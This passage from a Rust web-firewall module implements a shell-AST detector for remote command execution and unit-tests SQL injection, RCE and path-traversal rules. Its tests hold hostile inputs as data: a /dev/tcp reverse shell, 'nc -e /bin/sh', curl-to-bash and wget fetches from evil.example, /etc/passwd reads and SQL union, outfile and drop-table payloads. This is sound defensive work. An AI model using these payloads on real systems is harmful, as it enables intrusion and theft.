/// (so `$(id)`, `` `cat /etc/passwd` `` fire the default-on rule while `$(date)` /
/// jQuery-style `$('#x')` do not).
fn cmdsubst_inner_is_dangerous(inner: &str) -> bool {
    inner
        .split_whitespace()
        .next()
        .map(cmd_basename)
        .is_some_and(|first| DANGER_CMDS.contains(&first.as_str()))
}

/// The shell-AST rule table: `(rule_key, confidence, default_on)`. Confidences are
/// pre-holdout shadow starting values (plan §8.2 spirit). The high-noise
/// `rce_ast.cmd_subst_any` (any command substitution regardless of inner command)
/// ships **disabled** pending holdout calibration, exactly like the structural
/// detector's default-off rows.
struct ShellAstRule {
    key: &'static str,
    confidence: u8,
    default_on: bool,
}

const RCE_AST_RULES: &[ShellAstRule] = &[
    // `/dev/tcp` redirect, or `nc -e` — a complete reverse/bind-shell structure.
    ShellAstRule {
        key: "rce_ast.reverse_shell",
        confidence: 90,
        default_on: true,
    },
    // Interpreter fed by a here-document / here-string: `python <<EOF … EOF`,
    // `bash <<< "id"`. The structural detector has ZERO here-doc coverage.
    ShellAstRule {
        key: "rce_ast.heredoc_interp",
        confidence: 82,
        default_on: true,
    },
    // Interpreter with an inline-code exec flag as a real command head: `bash -c`,
    // `python -c`, `perl -e`, `powershell -enc`.
    ShellAstRule {
        key: "rce_ast.interp_exec_flag",
        confidence: 82,
        default_on: true,
    },
    // A pipeline whose downstream stage is an interpreter / net-shell: `curl x | bash`.
    ShellAstRule {
        key: "rce_ast.pipe_to_interp",
        confidence: 80,
        default_on: true,
    },
    // Command substitution whose inner command is a dangerous binary: `$(id)`.
    ShellAstRule {
        key: "rce_ast.cmd_subst",
        confidence: 78,
        default_on: true,
    },
    // Process substitution `<(…)` / `>(…)` — always a code-execution construct.
    ShellAstRule {
        key: "rce_ast.proc_subst",
        confidence: 72,
        default_on: true,
    },
    // Reader command against a sensitive path: `cat /etc/passwd` (AST corroboration).
    ShellAstRule {
        key: "rce_ast.sensitive_read",
        confidence: 70,
        default_on: true,
    },
    // DEFAULT-OFF (high-noise): any command substitution regardless of inner
    // command — jQuery `$('#x')` / template `$(var)` false-positive, so this awaits
    // holdout calibration.
    ShellAstRule {
        key: "rce_ast.cmd_subst_any",
        confidence: 50,
        default_on: false,
    },
];

fn rce_ast_rule(key: &str) -> Option<&'static ShellAstRule> {
    RCE_AST_RULES.iter().find(|r| r.key == key)
}

/// Mutable accumulator threaded through the AST walk — records every fired rule key
/// and bounds the per-word substitution re-parses.
struct ShellWalk<'a> {
    opts: &'a ParserOptions,
    fired: Vec<&'static str>,
    word_parses: usize,
}

impl ShellWalk<'_> {
    fn fire(&mut self, key: &'static str) {
        // Small, bounded set — a linear `contains` keeps the vec free of duplicates
        // without a hash allocation.
        if !self.fired.contains(&key) {
            self.fired.push(key);
        }
    }
}

/// `brush-parser` true shell-AST RCE detector (T1-A).
///
/// The **second** detector in the `Rce` family alongside [`RceStructuralDetector`];
/// it parses each decoded [`View`]'s text into a real shell syntax tree and fires
/// on dangerous *structures* the structural regex cannot see or over-matches on.
///
/// It inspects `view.text` (**not** `lower_trunc`, which collapses newlines and so
/// destroys here-document structure), applies a cheap metacharacter prefilter so
/// clean traffic never spends parser budget, and meters every parse against the
/// shared per-request AST budget ([`ContentInspectionState::try_take_ast_attempt`]
/// / [`try_take_ast_input_bytes`](ContentInspectionState::try_take_ast_input_bytes)).
/// Parsing is pure (no execution, no `unwrap`): a tokenize / parse error yields no
/// signal.
///
/// **Honest boundary (plan §5).** This is a *parser*, not an expander: brace
/// expansion (`{a,b}`) is represented but never expanded, so a brace-obfuscated
/// command name is not resolved here — that gap stays with the structural layer.
/// The walk descends into subshell / brace-group / function bodies (the wrappers
/// used to hide an injected command) but not into `if` / `for` / `while` / `case`
/// bodies; those forms are out of scope for T1-A.
pub struct RceAstDetector {
    opts: ParserOptions,
    all_rules: bool,
}

impl RceAstDetector {
    /// Production detector — only the default-on rules may fire.
    #[must_use]
    pub fn new() -> Self {
        Self {
            opts: ParserOptions::default(),
            all_rules: false,
        }
    }

    /// Test-only: allow every rule (including the default-off `cmd_subst_any`) to fire.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self {
            opts: ParserOptions::default(),
            all_rules: true,
        }
    }

    /// Parse `s` into a shell program, or `None` on a tokenize / parse failure.
    /// Pure: no execution, no panic — an error simply yields no signal.
    fn parse_program(&self, s: &str) -> Option<shell_ast::Program> {
        let tokens = brush_parser::tokenize_str(s).ok()?;
        brush_parser::parse_tokens(&tokens, &self.opts).ok()
    }
}

impl Default for RceAstDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for RceAstDetector {
    fn id(&self) -> DetectorId {
        DetectorId::RceAst
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        // Parse the structure-preserving text, NOT `lower_trunc` (which collapses
        // the newlines a here-document needs).
        let s = view.text.as_ref();
        if s.is_empty() || s.len() > SHELL_AST_MAX_INPUT_BYTES {
            return None;
        }
        // Cheap gate — clean traffic exits here without touching the AST budget.
        if !shell_ast_prefilter(s) {
            return None;
        }
        // Stack-overflow guard (P0 DoS): brush-parser's recursive-descent tokenizer
        // has no depth bound, so decline a payload whose delimiter nesting could
        // overflow the worker stack *before* handing it to `tokenize_str`. A Rust
        // stack overflow aborts the process and cannot be caught, so this must be a
        // pre-parse reject; the structural detector still inspects the field.
        if max_nesting_depth(s) > SHELL_MAX_NESTING_DEPTH {
            return None;
        }
        // DoS budget: one attempt + input bytes, shared with the SQL AST layer.
        if !state.try_take_ast_attempt() {
            return None;
        }
        if !state.try_take_ast_input_bytes(s.len()) {
            return None;
        }

        let program = self.parse_program(s)?;
        let mut walk = ShellWalk {
            opts: &self.opts,
            fired: Vec::new(),
            word_parses: 0,
        };
        walk_program(&program, &mut walk);

        // Pick the strongest ENABLED fired rule (default-on only in production).
        let all = self.all_rules;
        let best = walk
            .fired
            .iter()
            .filter_map(|k| rce_ast_rule(k))
            .filter(|r| all || r.default_on)
            .max_by_key(|r| r.confidence)?;

        Some(DetectionFinding {
            attack: AttackKind::Rce,
            confidence: Confidence::saturating(best.confidence),
            rule_key: best.key,
            detail: Cow::Owned(format!(
                "ast rce structure '{}' matched (confidence {})",
                best.key, best.confidence
            )),
        })
    }
}

/// Cheap pre-parse gate: only strings carrying a shell metacharacter / exec-flag
/// shape, or a sensitive path, are worth a parse attempt. Every default-on
/// shell-AST structure contains one of these markers (`|`, `$(`, backtick, `<<`,
/// `<(`/`>(`, `/dev/tcp`, an exec-flag token) — and the reader-against-sensitive-path
/// rule is admitted by the `/etc/` and `/proc/` markers — so gating on them never
/// drops a catch; it only spares clean traffic the parser budget. Deliberately does
/// **not** substring-match short interpreter names (`sh` occurs in `fresh`/`wash`),
/// which would waste attempts.
fn shell_ast_prefilter(s: &str) -> bool {
    s.contains('|')
        || s.contains("$(")
        || s.contains('`')
        || s.contains("<<")
        || s.contains("<(")
        || s.contains(">(")
        || s.contains("/dev/tcp")
        || s.contains("/dev/udp")
        || s.contains(" -c")
        || s.contains(" -e")
        || s.contains("/etc/")
        || s.contains("/proc/")
}

/// Cheap single-pass scan of the maximum number of *concurrently unclosed*
/// recursion-driving shell delimiters in `s` — the stack-overflow protection for
/// the AST parse (plan §8, P0 `DoS`). Tracks, and returns the running maximum sum of:
/// - parentheses (`(` … `)`) — covers `$( … )` command substitution, `( … )`
///   subshells, `$(( … ))` / `(( … ))` arithmetic, and `<( … )` / `>( … )` process
///   substitution (every one opens with a `(`);
/// - brace groups (`{ … }`) — covers `${ … }` parameter expansion and `{ …; }`;
/// - backtick command substitution (`` ` … ` ``) — paired by toggling.
///
/// Deliberately quote- and escape-agnostic: a conservative *over*-count only causes
/// an early decline (safe — the structural detector still runs), never a missed
/// parse. Pure, no allocation, no brush-parser call.
fn max_nesting_depth(s: &str) -> usize {
    let mut paren: usize = 0;
    let mut brace: usize = 0;
    let mut backtick: usize = 0;
    let mut max_depth: usize = 0;
    for b in s.bytes() {
        match b {
            b'(' => paren += 1,
            b')' => paren = paren.saturating_sub(1),
            b'{' => brace += 1,
            b'}' => brace = brace.saturating_sub(1),
            b'`' => backtick ^= 1,
            _ => continue,
        }
        let depth = paren + brace + backtick;
        if depth > max_depth {
            max_depth = depth;
        }
    }
    max_depth
}

/// Walk every complete command of a parsed program.
fn walk_program(program: &shell_ast::Program, walk: &mut ShellWalk<'_>) {
    for cc in &program.complete_commands {
        walk_list(cc, 0, walk);
    }
}

/// Walk a compound list (a `CompleteCommand` or a subshell / brace-group body).
fn walk_list(list: &shell_ast::CompoundList, depth: usize, walk: &mut ShellWalk<'_>) {
    if depth > SHELL_WALK_MAX_DEPTH {
        return;
    }
    for item in &list.0 {
        walk_and_or(&item.0, depth, walk);
    }
}

/// Walk an and-or list (`a && b || c`) — the leading pipeline plus each continuation.
fn walk_and_or(aol: &shell_ast::AndOrList, depth: usize, walk: &mut ShellWalk<'_>) {
    walk_pipeline(&aol.first, depth, walk);
    for ao in &aol.additional {
        let (shell_ast::AndOr::And(p) | shell_ast::AndOr::Or(p)) = ao;
        walk_pipeline(p, depth, walk);
    }
}

/// Walk a pipeline: flag a pipe whose downstream stage is an interpreter / net-shell
/// (`curl x | bash`), then descend into each stage command.
fn walk_pipeline(pipe: &shell_ast::Pipeline, depth: usize, walk: &mut ShellWalk<'_>) {
    if pipe.seq.len() >= 2 {
        for cmd in pipe.seq.iter().skip(1) {
            if let shell_ast::Command::Simple(sc) = cmd
                && let Some(name) = simple_cmd_name(sc)
                && (is_interpreter(&name) || NET_SHELLS.contains(&name.as_str()))
            {
                walk.fire("rce_ast.pipe_to_interp");
            }
        }
    }
    for cmd in &pipe.seq {
        walk_command(cmd, depth, walk);
    }
}

/// Walk one command node.
fn walk_command(cmd: &shell_ast::Command, depth: usize, walk: &mut ShellWalk<'_>) {
    match cmd {
        shell_ast::Command::Simple(sc) => classify_simple(sc, walk),
        shell_ast::Command::Compound(cc, _redirects) => walk_compound(cc, depth + 1, walk),
        shell_ast::Command::Function(fd) => walk_compound(&fd.body.0, depth + 1, walk),
        shell_ast::Command::ExtendedTest(_, _) => {}
    }
}

/// Descend into the obfuscation wrappers an injected command hides behind: a
/// subshell `( … )` and a brace group `{ …; }`. `if`/`for`/`while`/`case` bodies
/// are intentionally out of scope for T1-A (documented honest boundary).
fn walk_compound(cc: &shell_ast::CompoundCommand, depth: usize, walk: &mut ShellWalk<'_>) {
    if depth > SHELL_WALK_MAX_DEPTH {
        return;
    }
    match cc {
        shell_ast::CompoundCommand::Subshell(s) => walk_list(&s.list, depth, walk),
        shell_ast::CompoundCommand::BraceGroup(b) => walk_list(&b.list, depth, walk),
        _ => {}
    }
}

/// Classify a single simple command against the shell-AST rule set.
fn classify_simple(sc: &shell_ast::SimpleCommand, walk: &mut ShellWalk<'_>) {
    let name = simple_cmd_name(sc);
    let name_is_interp = name.as_deref().is_some_and(is_interpreter);
    let name_is_net = name.as_deref().is_some_and(|n| NET_SHELLS.contains(&n));
    let name_is_reader = name.as_deref().is_some_and(|n| READERS.contains(&n));

    let mut has_exec_flag = false;
    let mut has_heredoc = false;
    let mut devtcp_redir = false;
    let mut sensitive_arg = false;
    let mut proc_subst = false;

    // The command head itself may be a substitution (`$(id)` as the command).
    if let Some(w) = &sc.word_or_name {
        classify_word_cmdsubst(&w.value, walk);
    }

    let empty = Vec::new();
    let prefix_items = sc.prefix.as_ref().map_or(&empty, |p| &p.0);
    let suffix_items = sc.suffix.as_ref().map_or(&empty, |s| &s.0);
    for item in prefix_items.iter().chain(suffix_items.iter()) {
        match item {
            shell_ast::CommandPrefixOrSuffixItem::Word(w) => {
                if EXEC_FLAGS.contains(&w.value.to_ascii_lowercase().as_str()) {
                    has_exec_flag = true;
                }
                if arg_hits_sensitive_path(&w.value) {
                    sensitive_arg = true;
                }
                classify_word_cmdsubst(&w.value, walk);
            }
            shell_ast::CommandPrefixOrSuffixItem::AssignmentWord(_, w) => {
                // `x=$(id) cmd` — a substitution smuggled through an assignment.
                classify_word_cmdsubst(&w.value, walk);
            }
            shell_ast::CommandPrefixOrSuffixItem::ProcessSubstitution(_, _) => proc_subst = true,
            shell_ast::CommandPrefixOrSuffixItem::IoRedirect(io) => match io {
                shell_ast::IoRedirect::HereDocument(_, _) | shell_ast::IoRedirect::HereString(_, _) => {
                    has_heredoc = true;
                }
                shell_ast::IoRedirect::File(_, _, target) => match target {
                    shell_ast::IoFileRedirectTarget::Filename(w) | shell_ast::IoFileRedirectTarget::Duplicate(w) => {
                        if is_devtcp_target(&w.value) {
                            devtcp_redir = true;
                        }
                    }
                    shell_ast::IoFileRedirectTarget::ProcessSubstitution(_, _) => proc_subst = true,
                    shell_ast::IoFileRedirectTarget::Fd(_) => {}
                },
                shell_ast::IoRedirect::OutputAndError(w, _) => {
                    if is_devtcp_target(&w.value) {
                        devtcp_redir = true;
                    }
                }
            },
        }
    }

    if devtcp_redir || (name_is_net && has_exec_flag) {
        walk.fire("rce_ast.reverse_shell");
    }
    if name_is_interp && has_heredoc {
        walk.fire("rce_ast.heredoc_interp");
    }
    if name_is_interp && has_exec_flag {
        walk.fire("rce_ast.interp_exec_flag");
    }
    if name_is_reader && sensitive_arg {
        walk.fire("rce_ast.sensitive_read");
    }
    if proc_subst {
        walk.fire("rce_ast.proc_subst");
    }
}

/// Sub-parse a word value for `$(…)` / backtick command substitutions and fire the
/// (dangerous-inner) / (any) substitution rules. Cheap-gated on the literal markers
/// and bounded by [`SHELL_MAX_WORD_PARSES`], so plain words never touch the word
/// parser.
fn classify_word_cmdsubst(value: &str, walk: &mut ShellWalk<'_>) {
    if walk.word_parses >= SHELL_MAX_WORD_PARSES {
        return;
    }
    if !(value.contains("$(") || value.contains('`')) {
        return;
    }
    walk.word_parses += 1;
    let Ok(pieces) = shell_word::parse(value, walk.opts) else {
        return;
    };
    scan_word_pieces(&pieces, walk);
}

/// Recurse through parsed word pieces (descending into double-quoted sequences)
/// firing the command-substitution rules.
fn scan_word_pieces(pieces: &[WordPieceWithSource], walk: &mut ShellWalk<'_>) {
    for pw in pieces {
        match &pw.piece {
            WordPiece::CommandSubstitution(inner) | WordPiece::BackquotedCommandSubstitution(inner) => {
                if cmdsubst_inner_is_dangerous(inner) {
                    walk.fire("rce_ast.cmd_subst");
                } else {
                    walk.fire("rce_ast.cmd_subst_any");
                }
            }
            WordPiece::DoubleQuotedSequence(seq) | WordPiece::GettextDoubleQuotedSequence(seq) => {
                scan_word_pieces(seq, walk);
            }
            _ => {}
        }
    }
}

/// The **default-on** RCE + Traversal rule patterns — the single source of truth
/// the Lane 2 preprocessor gates share (codex A-3).
///
/// A synthetic view (shell-normalise / blind base64 / blind hex) is only worth
/// emitting when a *default-on* detector could actually fire on its result. Rather
/// than maintain a second, drift-prone copy of the "strong structure" list in the
/// preprocessor, both the shell-emission gate ([`super::preprocess::shell_normalize`])
/// and the blind base64/hex gate ([`super::preprocess`] `looks_structural`) build
/// their RCE/Traversal marker from exactly these patterns. Removing a rule, adding
/// one, or toggling `default_on` here therefore updates the gates in lock-step —
/// the gate can never accept a structure the default-on detector would reject, nor
/// reject one it would accept.
pub(crate) fn default_on_rce_traversal_patterns() -> impl Iterator<Item = &'static str> {
    RCE_RULES
        .iter()
        .chain(TRAVERSAL_RULES.iter())
        .filter(|(_, _, _, _, default_on)| *default_on)
        .map(|(_, _, pattern, _, _)| *pattern)
}

#[cfg(test)]
mod tests {
    use std::borrow::Cow;
    use std::collections::HashMap;
    use std::sync::Arc;

    use bytes::Bytes;
    use waf_common::{HostConfig, RequestCtx};

    use super::*;
    use crate::checks::content_security::budget::ContentInspectionState;
    use crate::checks::content_security::types::{InspectionScope, Provenance};

    fn view(text: &str) -> View<'static> {
        // Mirror the preprocessor's normalisation so tests exercise the real
        // matching surface (lowercase, whitespace-collapsed).
        let lower_trunc: String = text
            .to_ascii_lowercase()
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ");
        View {
            location: Cow::Borrowed("query"),
            round: 0,
            text: Cow::Owned(text.to_string()),
            lower_trunc,
            provenance: Provenance::Raw,
        }
    }

    fn throwaway_req() -> RequestCtx {
        RequestCtx {
            req_id: "t".to_string(),
            client_ip: "127.0.0.1".parse().expect("ip"),
            client_port: 0,
            method: "GET".to_string(),
            host: "example.com".to_string(),
            port: 80,
            path: "/".to_string(),
            query: String::new(),
            headers: HashMap::new(),
            body_preview: Bytes::new(),
            content_length: 0,
            is_tls: false,
            host_config: Arc::new(HostConfig::default()),
            geo: None,
        }
    }

    fn fire(text: &str) -> Option<DetectionFinding> {
        let det = StructuralSqlDetector::new();
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::default();
        det.detect(&view(text), &pctx, &mut st)
    }

    /// Fire against the FULL rule set (including default-off rules).
    fn fire_all(text: &str) -> Option<DetectionFinding> {
        let det = StructuralSqlDetector::with_all_rules();
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::default();
        det.detect(&view(text), &pctx, &mut st)
    }

    #[test]
    fn all_rules_compile() {
        // Every pattern in the table must compile (default-on and default-off).
        let det = StructuralSqlDetector::with_all_rules();
        assert_eq!(det.rules.len(), RULES.len(), "every rule pattern must compile");
    }

    #[test]
    fn default_on_excludes_high_noise_rules() {
        // plan v2.2: stacked / chr / hex / info_schema ship disabled by default.
        let det = StructuralSqlDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        for off in ["sql.stacked", "sql.chr_freq", "sql.hex_const", "sql.info_schema"] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
        for onk in [
            "sql.into_outfile",
            "sql.dangerous_fn",
            "sql.union_null",
            "sql.union_select",
            "sql.version_comment",
        ] {
            assert!(on.contains(onk), "{onk} must be default-on");
        }
    }

    #[test]
    fn union_select_fires() {
        let f = fire("1 union select username,password from users").expect("union select must fire");
        assert!(matches!(f.rule_key, "sql.union_null" | "sql.union_select"));
        assert_eq!(f.attack, AttackKind::SqlInjection);
    }

    #[test]
    fn union_all_select_fires() {
        // `union all select` / `union distinct select` are still SQL context.
        assert!(fire("1 union all select 1,2").is_some());
        assert!(fire("1 union distinct select 1,2").is_some());
    }

    #[test]
    fn stacked_query_fires_when_enabled() {
        // Default-off, but must fire when the full rule set is compiled.
        let f = fire_all("1; drop table users").expect("stacked query must fire with all rules");
        assert_eq!(f.rule_key, "sql.stacked");
        // …and must NOT fire on the default-on rule set.
        assert!(fire("1; drop table users").is_none(), "stacked is default-off");
    }

    #[test]
    fn into_outfile_is_strongest() {
        // outfile (95) beats a co-occurring union (≤78) → hard-veto candidate wins.
        let f = fire("1 union select 1 into outfile '/tmp/x'").expect("outfile must fire");
        assert_eq!(f.rule_key, "sql.into_outfile", "strongest rule wins");
        assert_eq!(f.confidence, 95);
    }

    #[test]
    fn dangerous_fn_fires() {
        assert_eq!(
            fire("1 and sleep(5)").expect("sleep must fire").rule_key,
            "sql.dangerous_fn"
        );
        assert_eq!(
            fire("1 and extractvalue(1,concat(0x7e,version()))")
                .expect("extractvalue must fire")
                .rule_key,
            "sql.dangerous_fn"
        );
    }

    #[test]
    fn version_comment_fires() {
        // A bare version comment (no union/select) fires exactly the version rule.
        assert_eq!(
            fire("/*!12345 x */").expect("bare version comment fires").rule_key,
            "sql.version_comment"
        );
    }

    #[test]
    fn clean_traffic_does_not_fire() {
        // Prose, JSON and ordinary queries must not trip any rule.
        assert!(fire("the quick brown fox jumps over the lazy dog").is_none());
        assert!(fire(r#"{"name":"alice","role":"admin","age":30}"#).is_none());
        assert!(fire("q=laptop&sort=price&order=asc&page=2").is_none());
        assert!(
            fire("SELECTED_ITEMS=3&reunion=family").is_none(),
            "word-boundary guards"
        );
        assert!(fire("please sleep well tonight").is_none(), "sleep without call parens");
    }

    /// codex §3.2 false-positive corpus: every one of these benign inputs must
    /// stay below the default log threshold (i.e. produce no finding) on the
    /// DEFAULT-ON rule set. This is the calibration evidence for shadow-on.
    #[test]
    fn clean_traffic_codex_negatives_do_not_fire() {
        // union/select in prose or as unrelated params — no adjacency, no fire.
        assert!(
            fire("the union will select a representative for the committee").is_none(),
            "prose 'union … select' must not fire"
        );
        assert!(
            fire("operation=union&action=select&scope=all").is_none(),
            "unrelated union/select params must not fire"
        );
        // A plain licence banner comment — no version digit → version_comment off.
        assert!(
            fire("/*! license: MIT, see LICENSE for details */").is_none(),
            "non-version /*! banner must not fire"
        );
        // Bare information_schema field name (no `.tables`) — and rule is default-off.
        assert!(
            fire("column=information_schema&sort=asc").is_none(),
            "bare information_schema must not fire"
        );
        // Even with the full rule set, a bare information_schema without the
        // structural `.tables|.columns` form stays clean.
        assert!(
            fire_all("column=information_schema&sort=asc").is_none(),
            "bare information_schema is not structural"
        );
        // Repeated char( in code / a formula — chr_freq is default-off.
        assert!(
            fire("char(65)+char(66)+char(67)+char(68)+char(69)").is_none(),
            "code char( repetition must not fire (chr_freq default-off)"
        );
        // Hex constants in a log line — hex_const is default-off.
        assert!(
            fire("addr=0xdeadbeef nonce=0xcafebabe block=0x1f").is_none(),
            "log 0x constants must not fire (hex_const default-off)"
        );
        // benchmark / sleep mentioned as words (no call parens) — no fire.
        assert!(
            fire("see the benchmark results and sleep schedule").is_none(),
            "benchmark/sleep as words (no parens) must not fire"
        );
    }

    #[test]
    fn info_schema_structural_form_fires_when_enabled() {
        // The narrowed structural `information_schema.tables|columns` form still
        // fires under the full rule set, in isolation from the union rules.
        assert_eq!(
            fire_all("select table_name from information_schema.tables")
                .expect("structural info_schema.tables fires")
                .rule_key,
            "sql.info_schema"
        );
        assert_eq!(
            fire_all("select 1 from information_schema.columns where 1=1")
                .expect("info_schema.columns fires")
                .rule_key,
            "sql.info_schema"
        );
    }

    // ── RCE detector ─────────────────────────────────────────────────────────

    fn run(det: &dyn SemanticDetector, text: &str) -> Option<DetectionFinding> {
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::default();
        det.detect(&view(text), &pctx, &mut st)
    }

    fn rce_fire(text: &str) -> Option<DetectionFinding> {
        run(&RceStructuralDetector::new(), text)
    }

    fn rce_fire_all(text: &str) -> Option<DetectionFinding> {
        run(&RceStructuralDetector::with_all_rules(), text)
    }

    #[test]
    fn rce_all_rules_compile() {
        let det = RceStructuralDetector::with_all_rules();
        assert_eq!(det.rules.len(), RCE_RULES.len(), "every RCE pattern must compile");
    }

    #[test]
    fn rce_default_on_excludes_high_noise_rules() {
        let det = RceStructuralDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        for off in ["rce.cmd_sep_common", "rce.backtick_cmd", "rce.mkfifo_revshell"] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
        for onk in [
            "rce.reverse_shell",
            "rce.shell_exec_flag",
            "rce.cmd_subst",
            "rce.piped_shell",
            "rce.fetch_exec",
            "rce.sensitive_read",
        ] {
            assert!(on.contains(onk), "{onk} must be default-on");
        }
    }

    #[test]
    fn rce_reverse_shell_fires() {
        let f = rce_fire("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").expect("reverse shell fires");
        assert_eq!(f.rule_key, "rce.reverse_shell");
        assert_eq!(f.attack, AttackKind::Rce);
        assert_eq!(f.confidence, 92);
        // A FIFO reverse shell still fires via its `nc -e` component…
        assert!(rce_fire("mkfifo /tmp/f; nc -e /bin/sh 1.2.3.4 9001").is_some());
    }

    #[test]
    fn rce_bare_mkfifo_is_not_a_default_on_block() {
        // codex A-4: a bare `mkfifo` word (docs / ops tooling) must NOT reach
        // confidence 92 on the default-on set — it was removed from
        // `rce.reverse_shell`, and the joint form is default-off.
        assert!(
            rce_fire("mkfifo is a posix utility for creating named pipes").is_none(),
            "bare mkfifo doc must not fire a default-on RCE rule"
        );
        assert!(rce_fire("run mkfifo /tmp/myqueue to create the fifo").is_none());
        // A mkfifo + shell joint structure fires ONLY under the full (default-off)
        // rule set as `rce.mkfifo_revshell`; the default set stays quiet.
        let joint = "mkfifo /tmp/f then read the fifo with sh";
        assert!(rce_fire(joint).is_none(), "mkfifo_revshell is default-off");
        assert_eq!(
            rce_fire_all(joint)
                .expect("joint fifo revshell fires with all rules")
                .rule_key,
            "rce.mkfifo_revshell"
        );
    }

    #[test]
    fn rce_cmd_subst_fires_but_jquery_and_backtick_do_not() {
        assert_eq!(
            rce_fire("q=$(whoami)").expect("cmd subst fires").rule_key,
            "rce.cmd_subst"
        );
        // codex A-4: the backtick command-substitution form is now DEFAULT-OFF, so
        // a Markdown command span does not fire on the production set. (`whoami`
        // isolates the backtick rule — it is not matched by any other rule, unlike
        // `cat /etc/passwd`, which the sensitive-read rule catches independently.)
        assert!(
            rce_fire("`whoami`").is_none(),
            "backtick command subst is default-off in production"
        );
        assert!(
            rce_fire("see `curl --help` for the full option list").is_none(),
            "a Markdown command span must not fire on the default-on set"
        );
        // …but the backtick form still fires under the full rule set.
        assert_eq!(
            rce_fire_all("`whoami`")
                .expect("backtick subst fires with all rules")
                .rule_key,
            "rce.backtick_cmd"
        );
        // jQuery / templating must NOT trip cmd_subst (even with all rules).
        assert!(rce_fire_all("$(document).ready(function(){})").is_none());
        assert!(rce_fire_all("$('#main').addClass('active')").is_none());
    }

    #[test]
    fn rce_shell_exec_flag_and_piped_shell_fire() {
        assert_eq!(
            rce_fire("sh -c 'id'").expect("sh -c fires").rule_key,
            "rce.shell_exec_flag"
        );
        assert_eq!(
            rce_fire("python3 -c 'import os'").expect("python -c fires").rule_key,
            "rce.shell_exec_flag"
        );
        assert_eq!(
            rce_fire("curl http://evil/x | bash")
                .expect("pipe to shell fires")
                .rule_key,
            "rce.piped_shell"
        );
    }

    #[test]
    fn rce_fetch_exec_requires_argument_and_strong_separator() {
        assert_eq!(
            rce_fire("; wget http://evil.example/x.sh")
                .expect("fetch exec fires")
                .rule_key,
            "rce.fetch_exec"
        );
        // `&&` is a strong separator and still fires.
        assert_eq!(
            rce_fire("x && curl http://evil.example/y")
                .expect("&& curl fires")
                .rule_key,
            "rce.fetch_exec"
        );
        // codex A-4: a SINGLE `&` is the query/form field separator, NOT a shell
        // separator — `&curl help` must stay clean.
        assert!(
            rce_fire("sort=asc&curl help").is_none(),
            "a single & before curl+arg must not fire (field separator, not shell)"
        );
        assert!(
            rce_fire("a=1& curl the docs").is_none(),
            "single & + space + curl + word must not fire"
        );
        // `curl` as a value with no space+arg must NOT fire fetch_exec.
        assert!(rce_fire("method=curl&url=x").is_none(), "bare curl param must not fire");
    }

    #[test]
    fn rce_sensitive_read_fires() {
        // The shape `cat$IFS/etc/passwd` collapses to after shell normalisation.
        assert_eq!(
            rce_fire("cat /etc/passwd").expect("sensitive read fires").rule_key,
            "rce.sensitive_read"
        );
        assert_eq!(
            rce_fire("head /proc/self/environ").expect("proc read fires").rule_key,
            "rce.sensitive_read"
        );
    }

    #[test]
    fn rce_cmd_sep_common_is_default_off() {
        // Fires only under the full rule set; the default set stays quiet.
        assert_eq!(
            rce_fire_all("; ls -la")
                .expect("cmd_sep_common fires with all rules")
                .rule_key,
            "rce.cmd_sep_common"
        );
        assert!(rce_fire("; ls -la").is_none(), "cmd_sep_common is default-off");
    }

    #[test]
    fn rce_clean_traffic_does_not_fire() {
        // Bare separators / short words / prose that the FP-narrowing must reject,
        // plus a broadened holdout corpus of real docs / Markdown / JSON / CI
        // config / ops forms (codex A-4).
        for clean in [
            "a|b",
            "x&y&z",
            "cmd=sort|filter",
            "price sort order asc",
            "please ssh into the box",
            "the shell script and batch job",
            "user=nc_admin&role=member",
            "download the curl manual",
            "run benchmark and sleep",
            "a && b are both true",
            "id=42&name=alice",
            "path=/var/www/html/index.php",
            "select cat from animals where id=1",
            r#"{"cmd":"list","args":["a","b"]}"#,
            // ── broadened holdout: docs / Markdown / JSON / CI / ops ──
            "mkfifo is a posix utility for creating named pipes",
            "see the `curl --help` output for all supported flags",
            "install with: apt-get install curl wget netcat",
            "the article explains how bash and python differ",
            "step 3: run the python script to build the report",
            r#"{"tool":"curl","description":"http client","enabled":true}"#,
            r#"{"pipeline":[{"name":"build"},{"name":"deploy"}]}"#,
            r#"{"commands":["echo hello","ls -la"]}"#,
            "docs mention nc, ncat and socat as alternatives",
            "search=cat&category=pets&sort=name",
            "message=please review the perl regex in module.pm",
            "note: use `python3 -m venv` to create a virtualenv",
            "the powershell tutorial covers variables and loops",
            "filename=report_and_summary.pdf&format=pdf",
            "user typed: I love my cat and my dog",
        ] {
            assert!(rce_fire(clean).is_none(), "clean RCE negative fired: {clean:?}");
        }
    }

    // ── Traversal T1 detector ────────────────────────────────────────────────

    fn trav_fire(text: &str) -> Option<DetectionFinding> {
        run(&TraversalStructuralDetector::new(), text)
    }

    fn trav_fire_all(text: &str) -> Option<DetectionFinding> {
        run(&TraversalStructuralDetector::with_all_rules(), text)
    }

    #[test]
    fn traversal_all_rules_compile() {
        let det = TraversalStructuralDetector::with_all_rules();
        assert_eq!(
            det.rules.len(),
            TRAVERSAL_RULES.len(),
            "every traversal pattern must compile"
        );
    }

    #[test]
    fn traversal_default_on_excludes_plain_dotdot() {
        let det = TraversalStructuralDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        for off in ["traversal.plain_dotdot", "traversal.sensitive_abs_ops"] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
        for onk in [
            "traversal.overlong",
            "traversal.encoded_dotdot",
            "traversal.sensitive_abs",
        ] {
            assert!(on.contains(onk), "{onk} must be default-on");
        }
